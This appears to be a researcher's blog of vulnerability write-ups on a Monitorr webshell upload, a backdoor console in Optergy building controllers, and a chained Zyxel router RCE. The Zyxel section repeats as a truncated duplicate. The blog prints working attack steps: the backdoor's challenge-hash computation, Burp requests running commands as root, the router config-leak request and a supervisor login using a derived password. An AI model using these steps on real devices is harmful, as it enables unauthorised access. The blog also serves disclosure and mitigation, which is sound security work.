[Horizon3.ai: POC](https://github.com/horizon3ai/vRealizeLogInsightRCE)

### Credits
Credits goes to the security researchers below that analyzed the vulnerabilities and discovered the RCE chain.
* [Horizon3Attack team](https://twitter.com/Horizon3Attack)
* [James Horseman](https://twitter.com/JamesHorseman2)
* [Zach Hanley](https://twitter.com/hacks_zach)







---

## CVE-2020-28871
*Posted 2023-03-13 · last revised 2023-03-13*

> Remote code execution in Monitorr v1.7.6m in upload.php allows an unauthorized person to execute arbitrary code on the server-side via an insecure file upload.

`Monitorr` is a simple web application that allows you to setup a dashboard to monitor various web site / web application up or down state. It has been around for a while and is supported on both Linux and Windows, but development seems to be stalled.
Unfortunately this nice neat web application suffers from a remote code execution vulnerability that allows an attacker to upload a webshell tagged as a `GIF` image and execute malicious php code.
A typical vulnerability that has been in OSWASP top 10 [A04_2021-Insecure_Design](https://owasp.org/Top10/A04_2021-Insecure_Design/) for a long time => [CWE-343 Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html), but developers still seems to get this wrong.

All versions including `v1.7.6m` are vulnerable and no patch is available.

### Evidence of compromise
When you want to check if your system is compromised, please look for unexpected files with extension like `php`,  `phar`, `php7` in the `assets/data/usrimg` (Linux) or `assets\data\usrimg` (Windows) directory.   Also be conscious of the fact that the files might have been cleaned up by the attacker to cover their tracks.

### Mitigation
All versions of `Monitorr` are vulnerable, and the only mitigation is to restrict the execution of php code at the directory where the malicious file uploads are stored (Linux: `<web_root>/assets/data/usrimg` or Windows:  `<web_root\assets\data\usrimg`).

I have created a `Metasploit` module to test this vulnerability. A local version of this module can found at the **References** section.
[Submission](https://github.com/rapid7/metasploit-framework/pull/17771) to mainstream development is in progress.

### References
[CVE-2020-28871](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-28871)
[Lyins Lab Discovery](https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/)
[Public Exploit - Packetstorm](https://packetstormsecurity.com/files/170974/Monitorr-1.7.6-Shell-Upload.html)
[OSWASP top 10 - A04_2021-Insecure_Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)
[CWE-343 Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
[Metasploit Development h00die-gr3y] (https://github.com/h00die-gr3y/Metasploit/blob/main/README.md)

### Credits
Credits goes to `Lyins Lab` below who discovered  this vulnerability.

---

## CVE-2019-7276
*Posted 2023-03-21 · last revised 2023-04-19*

> Optergy Proton/Enterprise devices allow Remote Root Code Execution via a Backdoor Console.

## Backdoors
Since the dawn of our computing era, we have seen `backdoors` added in application code. You can find them in applications, operating systems, firmware etc and you see a variety of sophistication in the development and deployment of these `backdoors`. 
The more or less official definition of a `backdoor` can be found at [wikipedia](https://en.wikipedia.org/wiki/Backdoor_(computing)) and defines it as:
> A typically covert method of bypassing normal authentication or encryption in a computer, product, embedded device (e.g. a home router), or its embodiment.

`Backdoors` can vary from a simple hard coded user / password combination to sophisticated `rootkits`, `object code backdoors`, `asymmetric backdoors` and `compiler backdoors` which are quite well explained in the article.

Reasons to install `backdoors` are either for legitimate reasons to allow access to development or support but in most cases it has a malicious intent to enable unauthorized access to system and applications. In any case, allowing `backdoors` in your code is not a good idea, because how well coded and secure, there is always somebody that discovers the `damn` thing and starts using it for different reasons.

The example below shows a pretty sophisticated undocumented `backdoor` in the `Optergy` building management system. During a reverse engineering code review,  this backdoor was discovered in 2019 by a security researcher `Gjoko Krstic` a.k.a. `LiquidWorm`.

During the review a  backdoor script called `Console.jsp` located in `/usr/local/tomcat/webapps/ROOT/WEB-INF/jsp/tools/ ` was discovered which was not mentioned in any documentation, and it appeared to be a well-coded backdoor.  
Once you navigate to the console, issuing a command and clicking `Exec` resulted in errors. Clicking the `Get` button `ConsoleResult.html?get` returns a `JSON` response message:
```json
{"response":{"message":"1679481930381"}}
```
The question now is to satisfy this challenge response to successfully execute commands.

And after de-compiling the `ConsoleResult.class` java bytecode it revealed how this developer backdoor console actually works.

Lines `065`, `066`, and `067` of the code block below reveals the logic how to use this 'developer' console. 
The challenge is created once you issue the `/tools/ajax/ConsoleResult.html?get` AJAX request. This challenge is used to generate a `SHA-1` hash and then generate an `MD5` hash from the `SHA-1` hash. 
At the end, you must concatenate the two values which becomes the answer that you need to issue together with the command you want to execute in the request.

With Cyberchef, you can easily compile the recipe together to get the results.
[SHA1 of challenge value: 1679481930381](https://gchq.github.io/CyberChef/#recipe=SHA1(80)&input=MTY3OTQ4MTkzMDM4MQ)
[MD5 of SHA1](https://gchq.github.io/CyberChef/#recipe=SHA1(80)MD5()&input=MTY3OTQ4MTkzMDM4MQ)

```
Challenge: 1679481930381
SHA1: 6c2ba45326f687498923413420c890ebf5b7602c
MD5 of SHA1: 421dc80c2bea0c3710679605a6159162
Response: 6c2ba45326f687498923413420c890ebf5b7602c 421dc80c2bea0c3710679605a6159162
``` 
**Decompiled  ConsoleResult.class**

```java
ConsoleResult.class:
032: public class ConsoleResult
033: implements ActionBean, ValidationErrorHandler
034: {
035: private ActionBeanContext context;
036: @Validate(required=true, on={"execute"}, minlength=1)
037: private String command;
038: @Validate(required=true, on={"execute"}, minlength=1)
039: private String challenge;
040: @Validate(required=true, on={"execute"}, minlength=1)
041: private String answer;
042: private final Object lock;
043:
044: public ConsoleResult()
045: {
046: lock = new ConsoleResult.Lock(null);
047: }
048:
049:
050:
051:
052:
053:
054: @DefaultHandler
055: public Resolution execute()
056: {
057: long l1 = 1500L;
058: ServletContext localServletContext = getContext().getServletContext();
059: List localList = (List)localServletContext.getAttribute("challengeList");
060:
061: long l2 = Long.parseLong(challenge);
062: if ((localList != null) && (localList.contains(Long.valueOf(l2))))
063: {
064: localList.remove(Long.valueOf(l2));
065: String str1 = Util.makeSHA1Hash(Long.toString(l2));
066: String str2 = Util.makeMD5Hash(str1);
067: String str3 = str1 + str2;
068:
069: if (!str3.equals(answer))
070: {
071: return new JSONResolution(JSONConverter.createErrorResponse("Invalid Response to Answer"));
072: }
073:
074: String str4 = "";
075: ProcessStreamReader localProcessStreamReader = null;
076: try
077: {
078: String[] arrayOfString = command.split("\\ ");
079: ProcessBuilder localProcessBuilder = new ProcessBuilder(arrayOfString);
080: localProcessBuilder.redirectErrorStream(true);
081: Process localProcess = localProcessBuilder.start();
082: ConsoleResult.ProcessWrapper localProcessWrapper = new ConsoleResult.ProcessWrapper(this, localProcess);
083:
084: localProcessWrapper.start();
085: localProcessStreamReader = new ProcessStreamReader(localProcessWrapper.getfProcess().getInputStream());
086: localProcessStreamReader.start();
087: try
088: {
089: localProcessWrapper.join(l1);
090: localProcessStreamReader.join(l1);
091: }
092: catch (InterruptedException localInterruptedException)
093: {
094: localInterruptedException.printStackTrace();
095: localProcessWrapper.interrupt();
096: }
097: }
098: catch (Exception localException)
099: {
100: return new JSONResolution(JSONConverter.createErrorResponse("Invalid Command"));
101: }
102:
103:
104: str4 = localProcessStreamReader.getString();
105:
106: JSONObject localJSONObject = JSONConverter.createMessageResponse(str4);
107: return new JSONResolution(localJSONObject);
108: }
109: return new JSONResolution(JSONConverter.createErrorResponse("Invalid Challenge"));
110: }
111:
112: public Resolution get()
113: {
114: ServletContext localServletContext = getContext().getServletContext();
115: Object localObject = (List)localServletContext.getAttribute("challengeList");
116: if (localObject == null) {
117: localObject = new ArrayList();
118: }
119: long l = System.currentTimeMillis();
120: ((List)localObject).add(Long.valueOf(l));
121:
122: WebUtil.SetServletAttribute(localServletContext, "challengeList", localObject);
123:
124: JSONObject localJSONObject = JSONConverter.createMessageResponse(Long.toString(l));
125: return new JSONResolution(localJSONObject);
126: }
```
The Burp output below shows exactly what happens under the cover.

**Click Get button to get the challenge value**
```html
POST /tools/ajax/ConsoleResult.html?get HTTP/1.1
Host: 192.168.201.31
Content-Length: 0
Accept: */*
User-Agent: Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
Origin: http://192.168.201.31
Referer: http://192.168.201.31/tools/Console.t00t
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=D671EA8E9B1E2ED42528FD2DB16DE186
Connection: close
```
**Response is a `JSON` message with the challenge value**
```html
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Cache-Control: no-cache, private, no-store, must-revalidate
Pragma: no-cache
Expires: Thu, 01 Dec 1994 16:00:00 GMT
Content-Type: application/json;charset=utf-8
Content-Language: en-US
Content-Length: 40
Date: Wed, 22 Mar 2023 10:45:30 GMT
Connection: close

{
  "response": {
     "message":"1679481930381"
   }
}
```
Now use the `SHA1/MD5` recipe to determine the valid response to the challenge together with the command to be executed and click on the exec button.
This generates a POST request and executes the command.

**Execute the `whoami` command**
```html
POST /tools/ajax/ConsoleResult.html HTTP/1.1
Host: 192.168.201.31
Content-Length: 119
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.201.31
Referer: http://192.168.201.31/tools/Console.t00t
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=D671EA8E9B1E2ED42528FD2DB16DE186
Connection: close

&command=whoami&challenge=1679481930381&answer=6c2ba45326f687498923413420c890ebf5b7602c421dc80c2bea0c3710679605a6159162
```
**Response is a `JSON` message with the command output of  `whoami`**
```
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Cache-Control: no-cache, private, no-store, must-revalidate
Pragma: no-cache
Expires: Thu, 01 Dec 1994 16:00:00 GMT
Content-Type: application/json;charset=utf-8
Content-Language: en-US
Content-Length: 38
Date: Wed, 22 Mar 2023 10:49:56 GMT
Connection: close

{
"response":{
   "message":"optergy\r\n"
   }
}
```
The above example shows once more that even sophisticated `backdoors` can be discovered by code reviews and therefore become vulnerable to misuse of malicious actors. It underpins the guidance again to avoid programming `backdoors` in your application code.

## Mitigation
 All Optergy Proton / Enterprise versions `2.3.0a` and below are vulnerable.
Unfortunate like most `IoT` type applications, still vulnerable deployments can be found since the discovery in 2019. 
Patching `IoT` devices still remains a challenge for a lot of companies out there :-(

Please upgrade to the subsequent versions to  mitigate this vulnerability.

I could not resist the temptation to create a `Metasploit` module to test this vulnerability. A local version of this module can found at the **References** section and I have also created an [OVA image](https://github.com/h00die-gr3y/Metasploit/tree/main/images) with a vulnerable Optergy Proton application to play with.
[Submission](https://github.com/rapid7/metasploit-framework/pull/17806) to the mainstream of `Metasploit` is completed.


## References
[CVE-2019-7276](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7276)
[Applied Risk: Optergy Proton / Enterprise 2.3.0a Multiple Vulnerabilities](https://applied-risk.com/resources/ar-2019-008)
[Public Exploit - Packetstorm](https://packetstormsecurity.com/files/155258/Optergy-BMS-2.0.3a-Remote-Root.html)
[Metasploit module](https://github.com/rapid7/metasploit-framework/pull/17806)
[Metasploit Development h00die-gr3y] (https://github.com/h00die-gr3y/Metasploit/blob/main/README.md)

### Credits
Credits goes to `Gjoko Krstic` a.k.a. `LiquidWorm` who discovered  this vulnerability.


 


---

## Zyxel router chained RCE using LFI and Weak Password Derivation Algorithm (No CVE)
*Posted 2023-04-14 · last revised 2023-04-28*

> Multiple Zyxel devices are prone to different critical vulnerabilities resulting from insecure coding practices and insecure configuration.
 Besides the unauthenticated buffer overflow in the `zhttpd` webserver, two other vulnerabilities, the unauthenticated local file disclosure (LFI) in combination with a weak password derivation algorithm for user supervisor can be used to establish an unauthenticated RCE.
 
 The remote code execution (RCE) vulnerability can be exploited by chaining the local file disclosure (LFI) vulnerability in the `zhttpd` binary that allows an unauthenticated attacker to read the entire configuration of the router via the vulnerable endpoint  `/Export_Log?/data/zcfg_config.json`.
 
 With this information disclosure, the attacker can determine if the router is reachable via SSH and use the second vulnerability in the `zcmd` binary to derive the supervisor password by exploiting a weak password derivation algorithm using the device serial number.
 
 The following devices are affected:
 
 AMG1302-T11C	EOL
 VMG3925-B10C	EOL
 VMG8924-B10D	EOL
 VMG1312-B10D	EOL
 VMG3312-T20A	EOL
 VMG3625-T20A	EOL
 VMG3925-B10B	EOL
 VMG3925-B10C	EOL
 VMG3925-B30C	EOL
 VMG3926-B10A	EOL
 VMG5313-B10B	EOL
 VMG5313-B30B	EOL
 VMG8623-T50A	EOL
 VMG8823-B10B	EOL
 VMG8823-B30B	EOL
 VMG8823-B50B	EOL
 VMG8823-B60B	EOL
 VMG8924-B10D	EOL
 VMG8924-B30D	EOL
 PMG5317-T20A	EOL
 
 
 DX3301-T0	V5.50(ABVY.3)C0 in Sep. 2022*
 DX5401-B0	V5.17(ABYO.1)C0*
 EMG3525-T50B	EMEA - V5.50(ABPM.6)C0* || S. America - V5.50(ABSL.0)b12 in Sep. 2022*
 EMG5523-T50B	EMEA - V5.50(ABPM.6)C0* || S. America - V5.50(ABSL.0)b12 in Sep. 2022*
 EMG5723-T50K	V5.50(ABOM.7)C0*
 EX3301-T0	V5.50(ABVY.3)C0 in Sep. 2022*
 EX5401-B0	V5.17(ABYO.1)C0*
 EX5501-B0	V5.17(ABRY.2)C0*
 LTE3301-PLUS	V1.00(ABQU.3)C0*
 LTE7240-M403	V2.00(ABMG.4)C0*
 VMG1312-T20B	V5.50(ABSB.5)C0*
 VMG3625-T50B	V5.50(ABPM.6)C0*
 VMG3927-B50A	V5.17(ABMT.6)C0*
 VMG3927-B60A	V5.17(ABMT.6)C0*
 VMG3927-T50K	V5.50(ABOM.7)C0*
 VMG4005-B50A	V5.15(ABQA.2)C0 in Mar. 2022*
 VMG8623-T50B	V5.50(ABPM.6)C0*
 VMG8825-B50A	V5.17(ABMT.6)C0*
 VMG8825-B50B	V5.17(ABNY.7)C0*
 VMG8825-B60A	V5.17(ABMT.6)C0*
 VMG8825-B60B	V5.17(ABNY.7)C0*
 VMG8825-T50K	V5.50(ABOM.7)C0*
 XMG3927-B50A	V5.17(ABMT.6)C0*
 XMG8825-B50A	V5.17(ABMT.6)C0*
  	 
 Firewall:	 
 VPN2S	V1.20(ABLN.2)_00210319C1*
  	 
 ONT:	 
 AX7501-B0	V5.17(ABPC.1)C0*
 EP240P	V5.40(ABVH.1)C0 in May 2022*
 PMG5317-T20B	V5.40(ABKI.4)C0 in Apr. 2022*
 PMG5617GA	V5.40(ABNA.2)C0 in Apr. 2022*
 PMG5622GA	V5.40(ABNB.2)C0 in Apr. 2022*
  	 
 WiFi extender:	 
 WX3100-T0	V5.50(ABVL.1)C0 in Mar. 2022*
 WX3401-B0	V5.17(ABVE.1)C0*
  	 
 WiFi system:	 
 WSQ50 (Multy X)	V2.20(ABKJ.7)C0
 WSQ60 (Multy Plus)	V2.20(ABND.8)C0

In December 2022,  `SEC Consult` released a blog with the title [The enemy from within: Unauthenticated Buffer Overflows in Zyxel routers still haunting users ](https://sec-consult.com/blog/detail/enemy-within-unauthenticated-buffer-overflows-zyxel-routers/). The blog explains an unauthenticated buffer overflow in more then 40 different Zyxel router models and the fast amount of thousands of routers that are vulnerable and accessible via the Internet.
The impact is still quite limited because the published [Metasploit exploit module](https://github.com/rapid7/metasploit-framework/pull/17388) only works from the LAN side.

However, the **Unauthenticated Buffer Overflow** is not the only vulnerability on these routers and `SEC Consult` discovered another 7 vulnerabilities that are described in their security analysis [Multiple Critical Vulnerabilities in multiple Zyxel devices](https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/).
While reading the security analysis and reviewing the other vulnerabilities, I discovered a new opportunity to build an exploit by chaining two other vulnerabilities that will allow an unauthenticated attacker to get privileged access to the Zyxel router from either the WAN or LAN side. The potential of this exploit to attack from the WAN side makes it quite dangerous taking into account the large number of non-patched Zyxel routers out there on the Internet.

Recently, [CVE-2023-28770](https://www.tenable.com/cve/CVE-2023-28770) has been released covering the LFI vulnerability that is used in this  chained exploit.

## Zyxel router chained RCE 
### Exploiting an unauthenticated  local file disclosure (LFI) vulnerability and a weak password derivation algorithm
The first vulnerability that stood out to me is the LFI vulnerability that is discussed in section 2 of the [Security Analysis by SEC Consult](https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/).
The LFI vulnerability is present in the `zhttp` binary that allows an unauthenticated attacker to read the entire configuration of the router via the vulnerable endpoint `/Export_Log?/data/zcfg_config.json`.

The burp request below shows a redacted response of the information that is disclosed such as encrypted passwords, account information, information on services configuration (FTP, Telnet, SSH), and hardware details such as serial number, hardware model etc. In total around 4000 lines of nested `JSON` information that you would not like to share with anyone out there.
 
**LFI Burp request and response**
```
GET /Export_Log?/data/zcfg_config.json HTTP/1.1
Host: zyxel-vuln-router:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Connection: close
```
**Response (REDACTED)**
```json
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Length: 148678
Date: Fri, 14 Apr 2023 08:47:46 GMT
X-Frame-Options: sameorigin
Content-Security-Policy: frame-ancestors 'self'

---- Hardware Information ----
{
    "Manufacturer":"ZYXEL",
    "ManufacturerOUI":"XXXXX",
    "ModelName":"VMG3625-T20A",
    "Description":"Wireless AC VDSL2 4-port Gateway with USB",
    "ProductClass":"VMG3625-T20A",
    "SerialNumber":"SXXXXXXXXXXXX",
    "SoftwareVersion":"V5.30(ABOU.2)b1_I0_20180821",
    "AdditionalHardwareVersion":"",
    "AdditionalSoftwareVersion":"",
    "UpTime":607055,
    "FirstUseDate":"2023-03-21T09:07:41",
    "VendorConfigFileNumberOfEntries":0,
    "SupportedDataModelNumberOfEntries":0,
    "ProcessorNumberOfEntries":0,
    "VendorLogFileNumberOfEntries":0,
    "LocationNumberOfEntries":0,
    "FixManufacturerOUI":""
  },

---- Account Information----
"X_ZYXEL_LoginCfg":{
    "LoginGroupConfigurable":true,
    "LogGp":[
      {
        "GP_Privilege":"_encrypt_XXXXXXXXXXXXXX",
        "Account":[
          {
            "AutoShowQuickStart":false,
            "Enabled":true,
            "EnableQuickStart":true,
            "Page":"",
            "Username":"root",
            "Password":"",
            "PasswordHash":"",
            "Privilege":"_encrypt_XXXXXXXXXXXXX",
            "GetConfigByFtp":true,
            "DefaultPassword":"_encrypt_XXXXXXXXXXXXXX",
            "DefaultGuiPassword":"",
            "ResetDefaultPassword":false,
            "shadow":"root:$6$XXXXXXXXXXX:0::::::\n",
            "smbpasswd":"root:0:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:33A9D53C23525B5F63A0C536445E2B76:[U          ]:LCT-0000004E:\n",
            "ConfigAccountFromWAN":false,
            "DefPwLength":8,
            "AccountCreateTime":0,
            "AccountRetryTime":3,
            "AccountIdleTime":300,
            "AccountLockTime":300,
            "RemoHostAddress":"",
            "DotChangeDefPwd":false,
            "ShowSkipBtnInChgDefPwdPage":false,
            "AutoGenPwdBySn":false,
            "RemoteAccessPrivilege":"LAN",
            "OldDefaultPassword":"",
            "CardOrder":"",
            "ThemeColor":"",
            "HiddenPage":""
          },
          {
            "AutoShowQuickStart":false,
            "Enabled":true,
            "EnableQuickStart":true,
            "Page":"",
            "Username":"supervisor",
            "Password":"",
            "PasswordHash":"",
            "Privilege":"_encrypt_XXXXXXXXXXX",
            "DefaultPassword":"_encrypt_XXXXXXXXXXX",
            "DefaultGuiPassword":"",
            "ResetDefaultPassword":false,
            "shadow":"supervisor:$6$XXXXXXXXXX:0::::::\n",
            "smbpasswd":"supervisor:12:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:33A9D53C23525B5F63A0C536445E2B76:[U          ]:LCT-0000004E:\n",
            "ConfigAccountFromWAN":false,
            "DefPwLength":8,
            "AccountCreateTime":0,
            "AccountRetryTime":3,
            "AccountIdleTime":300,
            "AccountLockTime":300,
            "RemoHostAddress":"",
            "DotChangeDefPwd":false,
            "ShowSkipBtnInChgDefPwdPage":false,
            "AutoGenPwdBySn":false,
            "RemoteAccessPrivilege":"LAN",
            "OldDefaultPassword":"",
            "CardOrder":"",
            "ThemeColor":"",
            "HiddenPage":""
          }
        ],
        "Level":"high"
      },

---- Service Information ----
  "X_ZYXEL_RemoteManagement":{
    "Service":[
      {
        "Name":"HTTP",
        "Enable":true,
        "Protocol":6,
        "Port":8080,
        "Mode":"LAN_WAN",
        "TrustAll":true,
        "OldMode":"LAN_ONLY",
        "RestartDeamon":1,
        "LifeTime":20,
        "BoundInterfaceList":""
      },
      {
        "Name":"HTTPS",
        "Enable":true,
        "Protocol":6,
        "Port":443,
        "Mode":"LAN_WAN",
        "TrustAll":true,
        "OldMode":"LAN_ONLY",
        "RestartDeamon":true,
        "LifeTime":20,
        "BoundInterfaceList":""
      },
      {
        "Name":"FTP",
        "Enable":true,
        "Protocol":6,
        "Port":21,
        "Mode":"LAN_WAN",
        "TrustAll":true,
        "OldMode":"LAN_ONLY",
        "RestartDeamon":true,
        "LifeTime":20,
        "BoundInterfaceList":""
      },
      {
        "Name":"TELNET",
        "Enable":true,
        "Protocol":6,
        "Port":23,
        "Mode":"LAN_WAN",
        "TrustAll":true,
        "OldMode":"LAN_ONLY",
        "RestartDeamon":true,
        "LifeTime":20,
        "BoundInterfaceList":""
      },
      {
        "Name":"SSH",
        "Enable":true,
        "Protocol":6,
        "Port":22,
        "Mode":"LAN_WAN",
        "TrustAll":true,
        "OldMode":"LAN_ONLY",
        "RestartDeamon":true,
        "LifeTime":20,
        "BoundInterfaceList":""
      },
```
Now this information disclosure in itself will not pose a direct threat to these routers, but of course attackers could try to crack the obtained encrypted shadow passwords, but this will take a long time.

So is there any other way to use the disclosed information for a successful attack?
 And of course the answer is `YES!`

The second vulnerability that comes into play is the vulnerability described in section 3 of the analysis, **"Unsafe Storage of Sensitive Data"**. 
It explains the password derivation technique used to decrypt the `_encrypted_XXXXXX` passwords in the `JSON` configuration file using a static `AES Key and IV`.
But my attention was more drawn to another analysis [Getting root on a Zyxel VMG8825-T50 router](https://th0mas.nl/2020/03/26/getting-root-on-a-zyxel-vmg8825-t50-router/) done by `Thomas Rinsma` in 2020 that was referenced at the bottom of the section and where Thomas explains the password derivation techniques used on Zyxel routers.
In particular, section **"Tangent 2: key and password derivation mechanisms"** is quite interesting which describes in detail how the `supervisor` user password can be derived using the serial key of the router.

So what if we use the LFI vulnerability to get the serial key of the router and try to crack the `supervisor` password using this password derivation technique. 
We can then use the disclosed router services information  to check if `ssh` or `telnet` is enabled and accessible from the WAN and try to login as `supervisor` to gain access to the router.

`Bogi Napoleon Wennerstrøm` has reverse engineered and implemented  some of these derivation functions producing the `supervisor` password.
His repository can be found [here](https://github.com/boginw/zyxel-vmg8825-keygen) on Github.
I tested his password derivation functions and indeed I can confirm that either `zcfgBeCommonGenKeyBySerialNumMethod2` or `zcfgBeCommonGenKeyBySerialNumMethod3` are working on vulnerable Zyxel routers.

```console
# python ./main.py SXXXXXXXXXXXX <= redacted
zcfgBeCommonGenKeyBySerialNum                   : L8PBA3JD6H
zcfgBeCommonGenKeyBySerialNum_CBT               : 4a88dfa2
zcfgBeCommonGenKeyBySerialNumMethod2            : 4a88dfa2
=> zcfgBeCommonGenKeyBySerialNumMethod3         : aN66Q5D31Y <=
zcfgBeCommonGenKeyBySerialNumConfigLength(1)    : 778V3W7O
zcfgBeCommonGenKeyBySerialNumConfigLength(2)    : Yd3HvMpU
zcfgBeCommonGenKeyBySerialNumConfigLength(3)    : dByHvMzZ
zcfgBeCommonGenKeyBySerialNumConfigLengthOld(1) : 778V3W7O
zcfgBeCommonGenKeyBySerialNumConfigLengthOld(2) : Yd3HvMpU
zcfgBeCommonGenKeyBySerialNumConfigLengthOld(3) : dByHvMzZ
┌──(root💀cuckoo)-[~/zyxel_exploit/zyxel-vmg8825-keygen]
└─# ssh supervisor@zyxel-vuln-router
supervisor@zyxel-vuln-router's password:
$ uname -a
Linux VMG3625-T20A 2.6.36 #7 SMP Sat Aug 18 12:18:02 CET 2018 mips GNU/Linux
$ ﻿id
uid=12(supervisor) gid=12 groups=12
$
```
I have created a `Metasploit` module that chains these two vulnerabilities together to gain access to vulnerable Zyxel routers. 
[PR submission](https://github.com/rapid7/metasploit-framework/pull/17881) to mainstream `Metasploit` is in progress.

### Mitigation
Please follow this [Security Advisory](https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-multiple-vulnerabilities) of Zyxel to patch your router.
As temporary measure, you should disable all your services on the router such as `telnet`, `ftp` and `ssh` that allows access to the `supervisor` user and configure your web interface only to be accessible by the `admin` user.

### References
[CVE-2023-28770](https://www.tenable.com/cve/CVE-2023-28770)
[The enemy from within: Unauthenticated Buffer Overflows in Zyxel routers still haunting users ](https://sec-consult.com/blog/detail/enemy-within-unauthenticated-buffer-overflows-zyxel-routers/).
[Multiple Critical Vulnerabilities in multiple Zyxel devices](https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/).
[Getting root on a Zyxel VMG8825-T50 router](https://th0mas.nl/2020/03/26/getting-root-on-a-zyxel-vmg8825-t50-router/)
[Zyxel VMG8825-T50 Supervisor Keygen - Github](https://github.com/boginw/zyxel-vmg8825-keygen) 
[Zyxel Security Advisory](https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-multiple-vulnerabilities)
[ Metasploit PR: Zyxel router chained RCE using LFI and weak password derivation algorithm](https://github.com/rapid7/metasploit-framework/pull/17881)

### Credits
Credits goes to:
[SEC Consult team](https://sec-consult.com/contact/)
[Thomas Rinsma] (https://www.linkedin.com/in/thomasrinsma)
[Bogi Napoleon Wennerstrøm](https://github.com/boginw)





---

## CVE-2023-28770
*Posted 2023-04-28 · last revised 2023-05-16*

> The sensitive information exposure vulnerability in the CGI “Export_Log” and the binary “zcmd” in Zyxel DX5401-B0 firmware versions prior to V5.17(ABYO.1)C0 could allow a remote unauthenticated attacker to read the system files and to retrieve the password of the supervisor from the encrypted file.

In December 2022,  `SEC Consult` released a blog with the title [The enemy from within: Unauthenticated Buffer Overflows in Zyxel routers still haunting users ](https://sec-consult.com/blog/detail/enemy-within-unauthenticated-buffer-overflows-zyxel-routers/). The blog explains an unauthenticated buffer overflow in more then 40 different Zyxel router models and the fast amount of thousands of routers that are vulnerable and accessible via the Internet.
The impact is still quite limited because the published [Metasploit exploit module](https://github.com/rapid7/metasploit-framework/pull/17388) only works from the LAN side.

However, the **Unauthenticated Buffer Overflow** is not the only vulnerability on these routers and `SEC Consult` discovered another 7 vulnerabilities that are described in their security analysis [Multiple Critical Vulnerabilities in multiple Zyxel devices](https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/).
While reading the security analysis and reviewing the other vulnerabilities, I discovered a new opportunity to build an exploit by chaining two other vulnerabilities that will allow an unauthenticated attacker to get privileged access to the Zyxel router from either the WAN or LAN side. The potential of this exploit to attack from the WAN side makes it quite dangerous taking into account the large number of non-patched Zyxel routers out there on the Internet.

Recently, [CVE-2023-28770](https://www.tenable.com/cve/CVE-2023-28770) has been released covering the LFI vulnerability that is used in this  chained exploit.

## Zyxel router chained RCE 
### Exploiting an unauthenticated  local file disclosure (LFI) vulnerability and a weak password derivation algorithm
The first vulnerability that stood out to me is the LFI vulnerability that is discussed in section 2 of the [Security Analysis by SEC Consult](https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/).
The LFI vulnerability is present in the `zhttp` binary that allows an unauthenticated attacker to read the entire configuration of the router via the vulnerable endpoint `/Export_Log?/data/zcfg_config.json`.

The burp request below shows a redacted response of the information that is disclosed such as encrypted passwords, account information, information on services configuration (FTP, Telnet, SSH), and hardware details such as serial number, hardware model etc. In total around 4000 lines of nested `JSON` information that you would not like to share with anyone out there.
 
**LFI Burp request and response**
```
GET /Export_Log?/data/zcfg_config.json HTTP/1.1
Host: zyxel-vuln-router:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Connection: close
```
**Response (REDACTED)**
```json
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Length: 148678
Date: Fri, 14 Apr 2023 08:47:46 GMT
X-Frame-Options: sameorigin
Content-Security-Policy: frame-ancestors 'self'

---- Hardware Information ----
{
    "Manufacturer":"ZYXEL",
    "ManufacturerOUI":"XXXXX",
    "ModelName":"VMG3625-T20A",
    "Description":"Wireless AC VDSL2 4-port Gateway with USB",
    "ProductClass":"VMG3625-T20A",
    "SerialNumber":"S000Y00000000",
    "SoftwareVersion":"V5.30(ABOU.2)b1_I0_20180821",
    "AdditionalHardwareVersion":"",
    "AdditionalSoftwareVersion":"",
    "UpTime":607055,
    "FirstUseDate":"2023-03-21T09:07:41",
    "VendorConfigFileNumberOfEntries":0,
    "SupportedDataModelNumberOfEntries":0,
    "ProcessorNumberOfEntries":0,
    "VendorLogFileNumberOfEntries":0,
    "LocationNumberOfEntries":0,
    "FixManufacturerOUI":""
  },

---- Account Information----
"X_ZYXEL_LoginCfg":{
    "LoginGroupConfigurable":true,
    "LogGp":[
      {
        "GP_Privilege":"_encrypt_XXXXXXXXXXXXXX",
        "Account":[
          {
            "AutoShowQuickStart":false,
            "Enabled":true,
            "EnableQuickStart":true,
            "Page":"",
            "Username":"root",
            "Password":"",
            "PasswordHash":"",
            "Privilege":"_encrypt_XXXXXXXXXXXXX",
            "GetConfigByFtp":true,
